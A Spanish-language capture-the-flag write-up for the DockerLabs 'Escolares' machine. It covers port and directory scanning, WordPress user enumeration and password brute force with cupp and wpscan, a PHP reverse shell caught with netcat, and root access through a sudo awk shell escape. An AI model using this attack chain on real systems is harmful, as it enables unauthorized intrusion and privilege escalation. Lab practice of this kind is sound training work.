---
title: Escolares - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | Luisillo_o        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/7f83b9e1-1efc-47e7-8ce5-c23e2b3e5bce)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `22` (SSH)
- `80` (HTTP)

A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p 80,22 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/1c698515-45c1-423a-b81b-9a9a0526ba60)

# Exploración Web

Al acceder a la página web, observamos una pagina sobre una *Universidad de Ciberseguridad*.

![image](https://github.com/user-attachments/assets/c1f9320f-5e28-45fe-98bd-25c2a803932c)

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

Al analizar el código fuente de la página, encontramos una ruta hacia `profesores.html`, donde descubrimos que `luisillo` es el administrador de la instalación de WordPress.

![image](https://github.com/user-attachments/assets/f8a22e16-6c9d-4326-a1fc-133004368103)

# WordPress

Exploramos el directorio `wordpress` y observamos que necesitamos ajustar el archivo `/etc/hosts` para que el dominio `escolares.dl` funcione correctamente.
Añadimos lo siguiente a /etc/hosts:

![image](https://github.com/user-attachments/assets/6a175fca-b27a-4865-b269-c7235cc26717)

![image](https://github.com/user-attachments/assets/01d0e3c2-59a4-45c6-9a44-830b093601c1)

```txt
172.17.0.2 escolares.dl
```
![image](https://github.com/user-attachments/assets/26d3c04e-4e2c-4aca-af76-f1dd69938f43)

Repetimos el escaneo de directorios en `wordpress`:
```bash
gobuster dir -u escolares.dl/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img 
```
![image](https://github.com/user-attachments/assets/78af7eab-189b-4cbb-a863-f28a2c2867f6)

Identificamos al usuario *luisillo* como administrador. Procedemos con un ataque de fuerza bruta para descubrir su contraseña.

```bash
wpscan --url http://escolares.dl/wordpress -e u,cb,vp,vt
```
Encontramos el usuario que vimos en la ruta de antes de `profesores.html`, por lo que con se ve es un usuario en potencia para probar fuerza bruta.

![image](https://github.com/user-attachments/assets/21a0a639-5334-44e9-9463-f9a831e3f157)

##Fuerza bruta usuario "luisillo".

Creamos un diccionario de contraseñas utilizando cupp:

```bash
cupp -i 
```

![image](https://github.com/user-attachments/assets/2be2ec8e-6ba4-4e1c-9f98-70fcac195447)

Ejecutamos el ataque de fuerza bruta con `wpscan`:

```bash
wpscan --url http://escolares.dl/wordpress/ -U luisillo -P luisillo.txt
```

![image](https://github.com/user-attachments/assets/88dc4f7d-c65d-4f7b-bd9a-5d8727a477d7)

Obtenemos la contraseña de *luisillo* y accedemos al panel de administración de WordPress.

![image](https://github.com/user-attachments/assets/db6e7552-df85-455c-b8b9-19222b622268)


## Reverse Shell

Dentro del panel de administración, utilizamos un plugin que permite acceder a los archivos del servidor web. Subimos una reverse shell creada con *Pentest Monkey*:

[Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Nos ponemos a la escucha con `netcat`:

```bash 
nc -lvnp 4444
```

![image](https://github.com/user-attachments/assets/58b7b91a-e2a4-47f5-86e8-b15b8c8d2f26)

Accedemos a la URL donde subimos la reverse shell y establecemos la conexión. Verificamos que estamos ejecutando comandos como el usuario `www-data`.

![image](https://github.com/user-attachments/assets/93cb0367-a3de-4317-ba45-68e930f37faf)

## TTY ReverseShell

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```
# Escalada de Privilegios

Explorando el sistema, encontramos un archivo `secret.txt` en el directorio de *luisillo*. Este archivo contiene la contraseña de su cuenta.

![image](https://github.com/user-attachments/assets/dfeea024-eb46-4065-ba33-66cf01994575)

```bash
su luisillo
```

![image](https://github.com/user-attachments/assets/ec926bf5-ed7f-4694-9110-0c48f288a5c6)

Al ejecutar `sudo -l`, vemos que podemos ejecutar `awk` como `root`. Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
![image](https://github.com/user-attachments/assets/45826585-e997-46e3-9e36-246a50587dc5)

Ya seriamos root.


